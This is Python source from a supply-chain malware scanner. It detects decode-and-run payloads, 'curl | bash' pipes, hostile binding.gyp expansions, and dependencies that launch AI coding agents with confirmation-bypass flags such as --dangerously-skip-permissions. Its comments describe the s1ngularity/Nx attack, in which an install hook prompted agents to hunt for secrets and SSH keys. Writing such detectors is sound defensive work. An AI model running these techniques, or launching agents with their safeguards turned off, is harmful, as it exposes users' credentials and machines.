    call (_DECODE_CALL_RE: b64decode, atob, Buffer.from(…, 'base64'),
    fromhex, unhexlify, zlib.decompress, a cipher's decrypt) in the window
    of a file write — is written to that file and the file is then run,
    else None. litellm 1.82.7's proxy_server.py wrote a base64 payload to
    p.py and ran it with sys.executable when the proxy was imported."""
    if (not any(n in text for n in _DL_FILE_WRITE_NEEDLES) or not any(n in text for n in _DL_PATHRUN_NEEDLES)
            or _DECODE_CALL_RE.search(text) is None):
        return None
    rows = text.split("\n")
    hit = _dl_written_and_run(rows, lambda row: _DECODE_CALL_RE.search(row) is not None, False)
    return None if hit is None else (hit + 1, _dl_run_interp(rows[hit]))


def _dl_pathrun_after(rows, k, path):
    """The row index in [k, k+_DL_WINDOW] that runs the file named `path`
    (the same name, or the same string literal in a run sink's arguments),
    else None."""
    end = min(len(rows), k + _DL_WINDOW + 1)
    for j in range(k, end):
        row = rows[j]
        if len(row) > _DL_LONG_ROW or not any(n in row for n in _DL_PATHRUN_NEEDLES):
            continue
        for sm in _DL_PATHRUN_SINK_RE.finditer(row):
            if _dl_region_names_path(row[sm.end():sm.end() + _DL_ARG_SPAN], path):
                return j
    return None


# SC-PIPE-SHELL: a project's own code that runs a download piped into a shell
# (analyst gap: a bin script running `curl … | bash` passed a project scan,
# while the registry's import-time test catches it in a package). The same
# line test as the import-time one; a dependency's code gets that test
# instead (SC-IMPORT-RISK), so this rule is for first-party code.
_PIPE_SHELL_RULE = {
    "id": "SC-PIPE-SHELL", "name": "Download piped into a shell", "type": "HOTSPOT", "sev": "MAJOR",
    "msg": "Code runs a downloaded script through a shell.",
    "why": ("Piping a download into a shell runs whatever the server sends at that moment, with the "
            "program's privileges: nothing pins or checks it, so the server, or anyone who can change "
            "what it serves, decides what runs. Installers publish the line for people to paste once, "
            "after reading the script; code that runs it hands every run to that server."),
    "fix": "Download a pinned version, check its checksum or signature, and run that file; or drop the download.",
    "ref": "CWE-494 · Supply chain"}


# ---------------- Dependency drives your AI agent (SC-AGENT-HIJACK) ----------------
# A dependency that launches the user's own AI coding agent in an autonomous
# mode, to do the attacker's bidding, is the s1ngularity / Nx attack (Aug
# 2025, the first weaponized-AI-agent malware): a postinstall spawned
# `claude --dangerously-skip-permissions`, `gemini --yolo` and
# `q --trust-all-tools` with a prompt telling the agent to search the disk for
# secrets, wallets and SSH keys and write them out. A package has no reason to
# run your agent, and none at all to run it with the flag that turns off every
# confirmation. Dependency-only: an install-hook script or import-time code
# that hands a known agent CLI, with such a flag, to an exec/spawn call (your
# own automation driving your agent is your business). The bypass FLAG is the
# signal — on 118k real files only the agent tools themselves name these flags,
# and never next to an exec call — and a known agent name confirms it.
_AGENT_NAMES = r"claude|gemini|codex|aider|cline|opencode|cursor-agent|amazon-?q|qchat|q"
# In code a spawned binary is a string literal (a spawn target, "claude", or a
# command string, "claude --yolo"): require a quote before it, so a minified
# variable that happens to be named q is not one (a real false positive:
# @anthropic-ai/claude-code's minified cli.js packs a `q` variable, the flag
# string and an exec on one line). An install-hook COMMAND is a bare shell
# string, so there the binary is a shell token instead.
_AGENT_BIN_SRC = r"""(?<=["'])(?:""" + _AGENT_NAMES + r""")(?=["'\s])"""
_AGENT_BIN_CMD_SRC = r"(?<![\w./-])(?:" + _AGENT_NAMES + r")(?![\w./-])"
_AGENT_FLAG_SRC = (r"--(?:dangerously-skip-permissions|yolo|trust-all-tools"
                   r"|dangerously-bypass-approvals-and-sandbox|full-auto|yes-always|allow-all-tools)(?![\w-])"
                   r"|--(?:approval-mode|permission-mode)[=\s]+(?:yolo|bypassPermissions)")
_AGENT_BIN_RE = re.compile(_AGENT_BIN_SRC)
_AGENT_BIN_CMD_RE = re.compile(_AGENT_BIN_CMD_SRC)
_AGENT_FLAG_RE = re.compile(_AGENT_FLAG_SRC)


def agent_hijack(text):
    """-> (agent, flag, line) for the first line of dependency code that hands
    a known AI-agent CLI, with a flag that turns off its confirmations, to an
    exec/spawn call (see above), else None. `text` has \\n line endings."""
    if _AGENT_FLAG_RE.search(text) is None:
        return None
    for i, row in enumerate(text.split("\n")):
        if _EXEC_CALL_RE.search(row) is None:
            continue
        flag = _AGENT_FLAG_RE.search(row)
        binm = _AGENT_BIN_RE.search(row)
        if flag is not None and binm is not None:
            return binm.group().strip("'\""), flag.group(), i + 1
    return None


def agent_hijack_in_command(cmd):
    """-> (agent, flag) when an install-hook COMMAND launches the agent
    directly (the shell is the exec, so no exec call is needed), else None."""
    flag = _AGENT_FLAG_RE.search(cmd)
    binm = _AGENT_BIN_CMD_RE.search(cmd)
    if flag is not None and binm is not None:
        return binm.group().strip("'\""), flag.group()
    return None


_AGENT_HIJACK_WHY = (
    "A dependency that runs your AI coding agent hands the attacker your agent's access to your machine "
    "and accounts, and a flag like --dangerously-skip-permissions or --yolo runs it with every "
    "confirmation turned off: the s1ngularity / Nx attack spawned the agent from a postinstall hook to "
    "search the disk for secrets, wallets and SSH keys and write them out (the first weaponized-AI-agent "
    "malware). No package needs to launch your agent.")


def _agent_hijack_issue(path, line_no, lines, agent, flag, col=None, redactor=None):
    return mk_issue(
        {"id": "SC-AGENT-HIJACK", "name": "Dependency drives your AI agent", "type": "HOTSPOT", "sev": "CRITICAL",
         "msg": f"Dependency launches the {agent!r} AI agent with {flag} — running your coding agent "
                f"with its confirmations turned off.",
         "why": _AGENT_HIJACK_WHY,
         "fix": "Do not install or run this package; read what it tells the agent to do. Report it to the registry.",
         "ref": "CWE-506 · Supply chain"}, path, line_no, lines, col, redactor)


def dependency_agent_issue(path, text):
    """SC-AGENT-HIJACK (CRITICAL) for a dependency's file that launches an AI
    agent in an autonomous mode (agent_hijack), else None."""
    found = agent_hijack(text)
    if found is None:
        return None
    agent, flag, line = found
    lines = text.split("\n")
    return _agent_hijack_issue(path, line, lines, agent, flag, redactor=_Redactor(lines))


def node_candidates(rel):
    """Files Node tries for a path it is asked to run or load."""
    rel = rel.rstrip("/")
    return [rel, rel + ".js", rel + ".cjs", rel + ".mjs", rel + ".json", rel + ".node",
            rel + "/index.js", rel + "/index.cjs", rel + "/index.mjs", rel + "/index.json"]


# ---------------- Scripts by their #! line ----------------
# A file with no source extension still runs as code when its #! line names
# an interpreter: a package's bin/cli, a hook's ./setup. The line is the
# first line only (the kernel reads no further): `[ \t]`, never `\s`, which
# took the interpreter from the next line of `#!/usr/bin/env` + newline.
_SHEBANG_RE = re.compile(r"^#![ \t]*(\S+)(?:[ \t]+(?:-\S+[ \t]+)*(\S+))?")
#: Interpreters that run a script as JavaScript (or TypeScript).
_SHEBANG_JS_NAMES = frozenset({"node", "nodejs", "bun", "deno", "ts-node", "tsx"})


def shebang_lang(text):
    """'js' | 'py' | 'sh' | None: the language a script runs as, by its #!
    line (`#!/usr/bin/env node`, `#!/usr/bin/env -S deno run`,
    `#!/usr/bin/python3`, `#!/bin/sh`)."""
    m = _SHEBANG_RE.match(text)
    if not m:
        return None
    prog = m.group(1).rsplit("/", 1)[-1].lower()
    if prog == "env" and m.group(2):
        prog = m.group(2).rsplit("/", 1)[-1].lower()
    if prog in _SHEBANG_JS_NAMES:
        return "js"
    if _PYTHON_NAME_RE.match(prog):
        return "py"
    if prog in _SHELL_NAMES:
        return "sh"
    return None


def script_source_lang(head):
    """'js' or 'py' for a file without a source extension whose leading
    bytes `head` make it a JavaScript or Python script by its #! line: it
    runs as code, so project and --deps scans read it as source (they used
    to classify it by magic bytes only, so `bin/cli` or a hook's `./setup`
    was never read). None otherwise — shell scripts too: no rule reads
    shell."""
    head = bytes(head[:HEADER_SAMPLE_BYTES])
    if not head.startswith(b"#!") or looks_binary(head):
        return None
    lang = shebang_lang(head.decode("utf-8", "replace"))
    return lang if lang in ("js", "py") else None


_JSON_TOKEN_RE = re.compile(r'"(?:[^"\\]|\\.)*"|[{}\[\],:]')


def _script_key_lines(text):
    """{script name: 1-based line of its key} for the keys of the top-level
    "scripts" object of `text`, a JSON document that parsed. Keys are
    compared decoded (`"post\\u0069nstall"` too), and a repeated key or
    "scripts" object counts where it last appears, as the parser keeps the
    last one. Twin of the locator in the npm engine's scanManifest."""
    found, depth, containers = {}, 0, []
    top_key, in_scripts, expect_key = None, False, False
    line, pos = 1, 0
    for m in _JSON_TOKEN_RE.finditer(text):
        tok = m.group()
        if tok[0] == '"':
            if expect_key and (depth == 1 or (depth == 2 and in_scripts)):
                key = json.loads(tok)
                if depth == 1:
                    top_key = key
                    if key == "scripts":
                        found = {}                  # a later "scripts" replaces an earlier one
                else:
                    line += text.count("\n", pos, m.start())
                    pos = m.start()
                    found[key] = line
            expect_key = False
        elif tok in "{[":
            if depth == 1 and tok == "{":
                in_scripts = top_key == "scripts"   # at depth 1, "{" is the value of top_key
            containers.append(tok)
            depth += 1
            expect_key = tok == "{"
        elif tok in "}]":
            containers.pop()
            depth -= 1
            if depth < 2:
                in_scripts = False
            expect_key = False
        elif tok == ",":
            expect_key = containers[-1] == "{"
    return found


def is_dependency_manifest(path):
    """A manifest inside an installed-dependency directory (node_modules/, ...)
    belongs to a package that came from a registry: only the scripts npm runs
    for an installed dependency apply to it, not `prepare`."""
    parts = path.replace("\\", "/").split("/")[:-1]
    return any(part in DEP_MARKERS for part in parts)


def scan_manifest(path, content, registry=False):
    """Check package.json / pyproject.toml install hooks — the primary
    supply-chain attack vector.

    G11: mere *presence* of a lifecycle script is flagged (MAJOR); a hook whose
    command does what malicious hooks do, read as a program
    (hook_command_risk, 0.1.8), escalates to CRITICAL. The command's download
    and evaluation tools (INSTALL_HOOK_RE) are only a hint in the MAJOR
    finding's message: tokens a binary installer shares. Also covers setup.py
    and binding.gyp via scan_file()/scan_gyp() (see collect_files).

    Shared semantics 3: a leading BOM is stripped before parsing; an
    unparseable ROOT manifest is SC-MANIFEST-UNPARSEABLE (MAJOR). registry /
    dependency manifests count preinstall, install, postinstall; a project
    checkout also counts preprepare, prepare, postprepare, and there a
    prepare-family hook with neither a reason nor a hint is INFO (the
    project's own build step, e.g. `husky install`), while a hostile one
    stays CRITICAL."""
    data, issues = load_manifest(path, content)
    if data is None:
        return issues
    body = content[1:] if content.startswith("\ufeff") else content
    lines = body.split("\n")
    scripts = data.get("scripts")
    if isinstance(scripts, dict):
        key_lines = None
        for hook in (NPM_INSTALL_SCRIPTS if registry else NPM_LOCAL_INSTALL_SCRIPTS):
            cmd = scripts.get(hook)
            if not isinstance(cmd, str) or not cmd.strip():
                continue
            reasons = hook_command_risk(cmd)
            hint = not reasons and _hook_is_suspicious(cmd)
            sev = "INFO" if (not registry and hook in NPM_PREPARE_SCRIPTS
                             and not reasons and not hint) else None
            # the hook's key inside "scripts", not the first line naming it
            # (review: a dependency called "install" took the finding)
            if key_lines is None:
                key_lines = _script_key_lines(body)
            line_no = key_lines.get(hook) or next(
                (i + 1 for i, l in enumerate(lines) if f'"{hook}"' in l), 1)
            issues.append(_sc_install_hook_issue(path, line_no, lines, hook, cmd,
                                                 reasons, sev=sev, hint=hint))
    return issues


# gyp command expansions run a command while node-gyp configures the build:
# '<!(cmd)', '<!@(cmd)', and the same in gyp's later phases, '>!(cmd)' and
# '^!(cmd)'; '<!([argv…])' runs an argv list without a shell, and
# '<!pymod_do_main(module args)' imports `module` from the gyp file's
# directory and calls its DoMain. (gyp: pylib/gyp/input.py, ExpandVariables.)
_GYP_EXPANSION_RE = re.compile(r"[<>^]!@?(?:pymod_do_main)?\(")
# Any expansion or variable reference inside a command — '<(var)',
# '<!(cmd)', '<@(list)', '<|(file)' — whose value only gyp knows. Following
# the command, '<(module_root_dir)' and '<(DEPTH)' stand for the directory
# of the root binding.gyp, and any other one for a path outside the package.
_GYP_REFERENCE_RE = re.compile(r"[<>^](?:!?@?|\|)?(?:[-a-zA-Z0-9_.]+)?\(")
_GYP_ROOT_VARIABLES = frozenset({"module_root_dir", "DEPTH"})
# The ubiquitous benign form: print an include path of a dependency.
_GYP_NODE_REQUIRE_RE = re.compile(
    r"""node\s+-[ep]\s+(?:"|')\s*require\(\s*\\?["'][\w@./-]+\\?["']\s*\)(?:\.[\w$]+)*\s*;?\s*(?:"|')""")
# Bounds on one gyp document (review: scan_gyp was quadratic — 8,000 actions
# took 11.4 s, 4,000 expansions in one 60 KB string 29.5 s — and a document
# with more values than the walk visits was reported clean). Past either
# limit the walk stops and the file gets SC-TRUNCATED. Characters are code
# points, as Python counts them (the npm engine counts the same way).
_GYP_MAX_NODES = 100_000                 # values visited
_GYP_MAX_COMMAND_CHARS = 2_000_000       # characters of action/expansion commands examined
#: SC-INSTALL-HOOK findings listed per gyp file; the rest are summed up in one
#: more finding at the highest severity among them.
GYP_MAX_HOOK_FINDINGS = 100


# str() refuses an int of more than 4300 digits (a long hex literal in an
# action raised ValueError out of scan_gyp); such an int is shown in hex,
# as the npm engine shows it (pycompat.js pyIntStr).
_INT_STR_LIMIT = 10 ** 4300


def _gyp_str(value):
    """str(value) for an action argument, never refusing a large int."""
    try:
        return str(value)
    except ValueError:
        return _gyp_repr(value)


def _gyp_repr(value):
    if isinstance(value, int) and not isinstance(value, bool):
        if abs(value) < _INT_STR_LIMIT:
            try:
                return repr(value)
            except ValueError:             # a lower sys.set_int_max_str_digits()
                pass
        return hex(value)
    if isinstance(value, list):
        return "[" + ", ".join(_gyp_repr(v) for v in value) + "]"
    if isinstance(value, tuple):
        return "(" + ", ".join(_gyp_repr(v) for v in value) + ("," if len(value) == 1 else "") + ")"
    if isinstance(value, dict):
        return "{" + ", ".join(f"{_gyp_repr(k)}: {_gyp_repr(v)}" for k, v in value.items()) + "}"
    if isinstance(value, (set, frozenset)):
        return "{" + ", ".join(_gyp_repr(v) for v in value) + "}" if value else "set()"
    return repr(value)


def _gyp_closing_parens(text):
    """{offset of '(': offset of its balanced ')'}, in one pass (a stack)."""
    close, opened = {}, []
    for m in re.finditer(r"[()]", text):
        if text[m.start()] == "(":
            opened.append(m.start())
        elif opened:
            close[opened.pop()] = m.start()
    return close


def _gyp_expansion_commands(text):
    """(command, is_pymod) for every expansion in `text`, in order: the
    command up to its balanced closing parenthesis, or to the end of the
    string. The closing parenthesis of every '(' is found in one pass, not by
    a scan per expansion."""
    close = _gyp_closing_parens(text)
    for m in _GYP_EXPANSION_RE.finditer(text):
        i = m.end() - 1                  # its '('
        j = close.get(i)
        yield (text[i + 1:] if j is None else text[i + 1:j]), "pymod_do_main" in m.group()


def _gyp_hook_command(cmd, kind):
    """The shell command an expansion's `cmd` runs, as follow_hook reads it:
    the expansions and variables in it replaced ('<(module_root_dir)' and
    '<(DEPTH)' by '.', any other by '/_', a path outside the package), an
    argv list ('[…]') joined, and `pymod_do_main(module args)` as
    `python -m module args`."""
    close = _gyp_closing_parens(cmd)
    out, pos = [], 0
    for m in _GYP_REFERENCE_RE.finditer(cmd):
        if m.start() < pos:
            continue                     # inside one replaced already
        i = m.end() - 1
        j = close.get(i, len(cmd) - 1)
        variable = m.group() in ("<(", ">(", "^(")
        out.append(cmd[pos:m.start()])
        out.append("." if variable and cmd[i + 1:j].strip() in _GYP_ROOT_VARIABLES else "/_")
        pos = j + 1
    out.append(cmd[pos:])
    flat = "".join(out)
    if kind == "pymod":
        return "python -m " + flat
    if flat.lstrip().startswith("["):
        import ast
        import shlex
        try:
            argv = ast.literal_eval(flat.strip())
        except (ValueError, TypeError, SyntaxError, MemoryError, RecursionError):
            return flat
        if isinstance(argv, list) and argv and all(isinstance(a, str) for a in argv):
            return shlex.join(argv)
    return flat


def _gyp_package_files(follow):
    """The files of the package an expansion's command runs (a script, a
    `require('./x')`; not a tool, a path outside the package or a JSON file),
    as a frozenset (empty when none)."""
    targets, _complete = follow_hook(follow)
    return frozenset(t for t in targets
                     if not t.replace("\\", "/").startswith("/") and not t.lower().endswith(".json"))


def _gyp_commands(data):
    """-> (commands, truncated): (command, kind, node) for every action/rule
    command (kind "action", node: the dict holding "action") and every command
    expansion (kind "expansion", or "pymod" for pymod_do_main, whose command
    is its module and arguments; node None) anywhere in a parsed gyp document
    (targets, conditions, target_defaults, variables ...), and why the walk
    stopped early (None if it did not). Bounded walk, no recursion."""
    out, stack, seen, chars = [], [data], 0, 0
    truncated = None
    while stack:
        if seen >= _GYP_MAX_NODES:
            truncated = f"more than {_GYP_MAX_NODES} values in the gyp document"
            break
        node = stack.pop()
        seen += 1
        if isinstance(node, dict):
            for key, value in node.items():
                if key == "action" and isinstance(value, (list, tuple)):
                    cmd = " ".join(_gyp_str(a) for a in value)
                    out.append((cmd, "action", node))
                    chars += len(cmd)
                stack.append(key)
                stack.append(value)
        elif isinstance(node, (list, tuple, set, frozenset)):
            stack.extend(node)
        elif isinstance(node, str) and _GYP_EXPANSION_RE.search(node):
            for cmd, pymod in _gyp_expansion_commands(node):
                out.append((cmd, "pymod" if pymod else "expansion", None))
                chars += len(cmd)
                if chars > _GYP_MAX_COMMAND_CHARS:
                    break
        if chars > _GYP_MAX_COMMAND_CHARS:
            truncated = f"more than {_GYP_MAX_COMMAND_CHARS} characters of gyp commands"
            break
    out.reverse()
    return out, truncated


class _LineRedactor:
    """mk_issue's redaction of one file's lines when no scan context is
    active (PEM key blocks whole, the secret patterns on other lines, no
    entropy literals), computed once per line instead of once per finding
    (review: a gyp file with thousands of actions re-ran it for every one)."""

    def __init__(self, lines):
        self.lines = lines
        self._pem = None
        self._red = {}

    def secrets(self):
        return None

    def redacted(self, k):
        r = self._red.get(k)
        if r is None:
            if self._pem is None:
                self._pem = _pem_block_lines(self.lines)
            r = REDACTED if k in self._pem else _redact_context_line(self.lines[k])
            self._red[k] = r
        return r


_GYP_EXPANSION_FILE_WHY = (
    "A binding.gyp command expansion runs while node-gyp configures the build, on npm install, with no "
    "install script needed. This one runs a file of the package: it is listed for inventory, and in a "
    "dependency Lazaret follows it to that file and checks it like an install script (CRITICAL when it "
    "ships the environment or credentials off the machine, or runs code it downloads).")


def scan_gyp(path, content):
    """G11: binding.gyp custom build actions run arbitrary commands at
    `node-gyp rebuild` (i.e. `npm install` of any native module). Flag each
    action whose command looks hostile read as a program (hook_command_risk)
    CRITICAL, and any action at all as MAJOR — same policy as package.json
    lifecycle scripts.

    gyp files are Python literals (single quotes, comments, trailing commas),
    so both JSON and Python-literal syntax are accepted. Actions and rules
    are found anywhere in the document (conditions, target_defaults ...).
    Command expansions ('<!(cmd)', '>!(cmd)', '^!(cmd)', '<!([argv])',
    '<!pymod_do_main(module)') also run at configure time: they are flagged
    CRITICAL when the command looks hostile (its value is what it prints,
    so a request it prints is kept), MAJOR when it runs a download or
    evaluation tool (INSTALL_HOOK_RE: a hint), and listed as INFO
    inventory when it runs a file of the package (`node index.js`,
    `node -p "require('./lib/x')"`, a pymod_do_main module) — the Miasma
    trick: a payload run from binding.gyp, with no install script. Such a
    finding's `cmd` is the command as it runs (see _gyp_hook_command), so
    a --deps scan and the registry follow it to that file and escalate it to
    CRITICAL when the file fails the install-script test. The usual
    `<!(node -p "require('node-addon-api').include")` and pkg-config calls
    are not findings. An unparseable ROOT binding.gyp is
    SC-MANIFEST-UNPARSEABLE.

    An action's finding is on the line of its own "action" key; an
    expansion's on the first line holding its command. At most
    GYP_MAX_HOOK_FINDINGS are listed, then one finding sums up the rest; a
    document past the walk's bounds (_GYP_MAX_NODES values,
    _GYP_MAX_COMMAND_CHARS of commands) is SC-TRUNCATED, never silently
    clean. Linear in the size of the file."""
    data, issues, where = _load_manifest(path, content, python_literal=True, locate="action")
    if data is None:
        return issues
    body = content[1:] if content.startswith("\ufeff") else content
    lines = body.split("\n")
    commands, truncated = _gyp_commands(data)
    hooks = []                           # (cmd shown, kind, node, reasons, command followed, sev, hint)
    listed = set()                       # the files the listed INFO expansions run
    for cmd, kind, node in commands:
        if kind == "action":
            reasons = hook_command_risk(cmd)
            hooks.append((cmd, kind, node, reasons, None, None, not reasons and bool(INSTALL_HOOK_RE.search(cmd))))
            continue
        follow = _gyp_hook_command(cmd, kind)
        # an expansion's output is its value: a request it prints is kept
        reasons = hook_command_risk(follow, output_kept=True)
        hint = not reasons and bool(INSTALL_HOOK_RE.search(_GYP_NODE_REQUIRE_RE.sub(" ", cmd)))
        if not reasons and not hint:
            runs = _gyp_package_files(follow)
            if not runs or runs in listed:
                continue                 # the usual include-path queries; a file listed already
            listed.add(runs)
        shown = f"pymod_do_main({cmd})" if kind == "pymod" else cmd
        hooks.append((shown, kind, node, reasons, follow, None if reasons or hint else "INFO", hint))
    newlines = [m.start() for m in re.finditer("\n", body)] if hooks else []
    first_line = {}

    def line_of(cmd, kind, node):
        if kind == "action":
            at = where.get(id(node))
            return 1 if at is None else bisect.bisect_left(newlines, at[1]) + 1
        if not cmd or "\n" in cmd:
            return 1                     # no single line holds it
        if cmd not in first_line:
            at = body.find(cmd)
            if at < 0:                   # written with \' or \" in a quoted string
                at = next((a for a in (body.find(cmd.replace("'", "\\'")), body.find(cmd.replace('"', '\\"')))
                           if a >= 0), -1)
            first_line[cmd] = 1 if at < 0 else bisect.bisect_left(newlines, at) + 1
        return first_line[cmd]

    redactor = _LineRedactor(lines)
    for cmd, kind, node, reasons, follow, sev, hint in hooks[:GYP_MAX_HOOK_FINDINGS]:
        issue = _sc_install_hook_issue(
            path, line_of(cmd, kind, node), lines,
            "binding.gyp action" if kind == "action" else "binding.gyp command expansion",
            cmd, reasons, sev=sev, redactor=redactor, hint=hint)
        if follow is not None:
            issue["cmd"] = follow        # what a --deps scan and the registry follow
        if sev == "INFO":
            issue["why"] = _GYP_EXPANSION_FILE_WHY
        issues.append(issue)
    rest = hooks[GYP_MAX_HOOK_FINDINGS:]
    if rest:
        n_bad = sum(1 for h in rest if h[3])
        issues.append(mk_issue(
            {"id": "SC-INSTALL-HOOK", "name": "Install hook", "type": "HOTSPOT",
             "sev": "CRITICAL" if n_bad else ("MAJOR" if any(h[5] != "INFO" for h in rest) else "INFO"),
             "msg": (f"{len(rest)} more binding.gyp actions and command expansions run code at "
                     f"install time ({n_bad} of them look hostile); only the first "
                     f"{GYP_MAX_HOOK_FINDINGS} are listed."),
             "why": ("Each action and command expansion in a binding.gyp runs a command during "
                     "`node-gyp rebuild` (npm install). A file with this many is listed in part "
                     "so the report stays readable; this finding carries the highest severity "
                     "among the ones not listed."),
             "fix": "Review every action and command expansion in the file; use --ignore-scripts "
                    "in CI if unneeded.",
             "ref": "CWE-506 · Supply chain"},
            path, line_of(rest[0][0], rest[0][1], rest[0][2]), lines, redactor=redactor))
    if truncated:
        issues.append(truncated_issue(path, truncated))
    return issues

import codecs as _codecs
import pathlib as _pathlib
import stat as _stat
import traceback as _traceback
import urllib.parse as _urlparse

import lazaret as _lazaret_pkg   # __version__ (the package root imports nothing)
VERSION = _lazaret_pkg.__version__     # what every command's --version prints

# ---------------- File collection (the project walk) ----------------
# The walk is the attack surface a hostile repository controls completely, so:
#   * only REGULAR files are ever opened (lstat + S_ISREG, and O_NOFOLLOW |
#     O_NONBLOCK + fstat at open time): a FIFO named b.py used to hang the
#     scan forever, a symlink to /dev/urandom exhausted memory, and a symlink
#     to a host file pulled that file into the report;
#   * symlinks are never followed; each one inside the tree is an INFO
#     Q-SYMLINK finding; unreadable entries are INFO Q-UNREADABLE findings;
#   * reads are bounded (size cap + 1 for scanned files, a header sample for
#     everything else);
#   * the walk is iterative (os.walk recursed: a 1,100-deep tree raised
#     RecursionError on 3.10/3.11);
#   * paths in findings are root-relative and valid UTF-8 (a non-UTF-8 file
#     name crashed the HTML writer after the scan).

def _env_int(var, default):
    """A positive integer from the environment, else `default` (parsed like
    the registry scanner's LAZARET_* limits)."""
    try:
        value = int(os.environ.get(var, default))
    except (TypeError, ValueError):
        return default
    return value if value > 0 else default


#: Files that would be source-scanned or parsed as manifests and are larger
#: than this are not read: they get an SC-TRUNCATED finding instead. Every
#: other file is classified from a header sample whatever its size. The old
#: 2,000,000 made `--deps` report SC-TRUNCATED (CRITICAL) for ordinary
#: single-file bundles: typescript's lib/typescript.js (9.1 MB) and _tsc.js
#: (6.2 MB), @babel/standalone's babel.js (5.3 MB). The scan is linear; an
#: 8 MB bundle takes about 5 s. Env LAZARET_MAX_SOURCE_BYTES (shared with
#: lazaret-registry) or --max-source-bytes; the MCP server uses the same value.
SOURCE_SIZE_CAP = _env_int("LAZARET_MAX_SOURCE_BYTES", 16_000_000)
#: Bytes read from every non-source regular file for magic-byte classification.
HEADER_SAMPLE_BYTES = 512
MANIFEST_NAMES = ("package.json", "binding.gyp")
#: gyp files, whatever their name: binding.gyp pulls others in ('includes':
#: ['build/common.gypi']) and node-gyp runs their actions and command
#: expansions too, so every one is parsed by scan_gyp (as the registry does).
GYP_EXTS = (".gyp", ".gypi")
#: AppleDouble / AppleSingle metadata ("._name" files macOS writes on non-HFS
#: volumes and into tarballs). Starts with a NUL, so it can never be Python or
#: JavaScript source; it is classified like any other non-source file.
APPLE_DOUBLE_MAGIC = (b"\x00\x05\x16\x07", b"\x00\x05\x16\x00")
#: PEP 263 encoding declaration (Python source), on raw bytes.
_PY_COOKIE_RE = re.compile(rb"^[ \t\f]*#.*?coding[:=][ \t]*([-\w.]+)")
_PY_BLANK_RE = re.compile(rb"^[ \t\f]*(?:#.*)?$")
_UTF7_NAMES = frozenset({"utf-7", "utf7", "u7", "unicode-1-1-utf-7"})


class ScanTargetError(ValueError):
    """The scan target is missing, not a directory, unreadable or has nothing
    to scan. A usage error: the CLI exits 2."""


class _NotRegularFile(OSError):
    """Raised by _read_prefix when the path is not a regular file at open time."""


def _fs_display(path):
    """A path as valid UTF-8 text, the same on every host. On POSIX a name is
    bytes; it is shown as those bytes read as UTF-8, with anything that isn't
    UTF-8 as a backslash escape ('bad\\xff.py') — never as the host locale
    would decode it (under a Latin-1 locale os.scandir says 'bad\u00ffy.py'
    for the same file). Windows names are Unicode already; only unpaired
    surrogates need escaping there."""
    if os.name != "nt":
        return os.fsencode(path).decode("utf-8", "backslashreplace")
    try:
        path.encode("utf-8")
        return path
    except UnicodeEncodeError:
        return path.encode("utf-8", "backslashreplace").decode("utf-8")


def _safe_text(s):
    """Any str as valid UTF-8 text (lone surrogates become escapes)."""
    s = str(s)
    try:
        s.encode("utf-8")
        return s
    except UnicodeEncodeError:
        return s.encode("utf-8", "backslashreplace").decode("utf-8")


def _is_reparse_point(st):
    """Windows junctions / mount points are not symlinks to os.lstat on older
    Pythons; treat any reparse-point directory like a symlink (never followed)."""
    return bool(getattr(st, "st_file_attributes", 0) & 0x400)   # FILE_ATTRIBUTE_REPARSE_POINT


_SPECIAL_KIND = ((_stat.S_ISFIFO, "a named pipe (FIFO)"), (_stat.S_ISSOCK, "a socket"),
                 (_stat.S_ISCHR, "a character device"), (_stat.S_ISBLK, "a block device"))


def _special_kind(mode):
    return next((name for test, name in _SPECIAL_KIND if test(mode)), "not a regular file")


_OPEN_FLAGS = (os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0) | getattr(os, "O_NONBLOCK", 0)
               | getattr(os, "O_NOCTTY", 0) | getattr(os, "O_CLOEXEC", 0)
               | getattr(os, "O_BINARY", 0))


def _read_prefix(path, limit):
    """Read at most `limit` bytes of a REGULAR file without following a
    symlink or blocking on a FIFO swapped in after the lstat (O_NOFOLLOW |
    O_NONBLOCK, then fstat). Raises OSError (incl. _NotRegularFile)."""
    fd = os.open(path, _OPEN_FLAGS)
    try:
        st = os.fstat(fd)
        if not _stat.S_ISREG(st.st_mode):
            raise _NotRegularFile(f"{_special_kind(st.st_mode)}")
        chunks, remaining = [], limit
        while remaining > 0:
            chunk = os.read(fd, min(remaining, 1 << 20))
            if not chunk:
                break
            chunks.append(chunk)
            remaining -= len(chunk)
        return b"".join(chunks)
    finally:
        os.close(fd)


def _coverage_issue(rule, name, path, msg, why, fix, ref="Maintainability"):
    return {"rule": rule, "name": name, "type": "SMELL", "sev": "INFO",
            "msg": msg, "why": why, "fix": fix, "ref": ref,
            "file": path, "line": 1, "snippet": [], "snipStart": 1}


def symlink_issue(path, target):
    """Q-SYMLINK: a symbolic link inside the tree (never followed)."""
    target = _safe_text(target)
    if len(target) > 200:
        target = target[:197] + "..."
    return _coverage_issue(
        "Q-SYMLINK", "Symbolic link (not followed)", path,
        f"Symbolic link {path} -> {target} was not followed; its target was not scanned.",
        "Following links would let a repository pull files from outside the scanned tree "
        "(host credentials, /dev/urandom) into the scan and its reports, or loop forever. "
        "The link target is not part of the tree under review.",
        "If the target belongs to the project, scan it directly.",
        "CWE-59 · Scan coverage")


def unreadable_issue(path, reason):
    """Q-UNREADABLE: an entry that could not be read (permissions, special file)."""
    return _coverage_issue(
        "Q-UNREADABLE", "Unreadable entry (not scanned)", path,
        f"{path} could not be read ({_safe_text(reason)}); it was not scanned.",
        "An entry the scanner cannot read is invisible to every rule. Special files "
        "(named pipes, sockets, devices) are never opened: reading one can hang or "
        "exhaust the scan.",
        "Fix the permissions (or remove the special file) and re-scan.",
        "Scan coverage")


def config_skipped_issue(path, detail):
    """Q-SKIPPED-CONFIG: a config or data file too large to check for credentials."""
    return _coverage_issue(
        "Q-SKIPPED-CONFIG", "Config file not checked (too large)", path,
        f"{path} was not checked for credentials: {_safe_text(detail)}.",
        "Config and data files are read only to look for credentials, and one this large is "
        "data rather than configuration: a credential in it would not be reported.",
        "Keep credentials out of large data files, and real configuration in files of its own.",
        "Scan coverage")


def scan_error_issue(path, exc):
    """SC-TRUNCATED for a file (or directory) whose scan raised: the run goes
    on without its findings, and like any file not fully scanned it fails the
    gate. It was an INFO note (Q-SCAN-ERROR), so a file whose scan died took
    its CRITICAL findings with it and the gate passed (review B3: a 6 MB
    string line overflowed the npm engine's regex stack)."""
    issue = truncated_issue(path, f"its scan failed ({type(exc).__name__}), so its findings are missing")
    issue["why"] = ("An internal error stopped this scan; the rest of the project is still "
                    "scanned and reported, but nothing in this file was checked, so the result "
                    "can't clear it.")
